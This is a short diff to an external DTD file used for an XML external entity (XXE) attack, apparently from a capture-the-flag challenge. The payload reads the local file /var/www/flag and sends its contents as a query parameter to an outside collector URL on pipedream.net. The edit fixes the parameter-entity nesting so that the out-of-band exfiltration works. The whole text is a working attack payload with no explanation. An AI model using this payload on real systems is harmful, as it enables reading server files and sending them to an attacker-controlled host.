@@ -1,3 +1,4 @@
 <!ENTITY % d SYSTEM "file:///var/www/flag">
-<!ENTITY % c "<!ENTITY rrr SYSTEM 'https://eny8nzgs41uxxs2.m.pipedream.net?asdf=%d;'>">
+<!ENTITY % c "<!ENTITY &#x25; rrr SYSTEM 'https://eny8nzgs41uxxs2.m.pipedream.net?asdf=%d;'>">
 %c;
+%rrr;
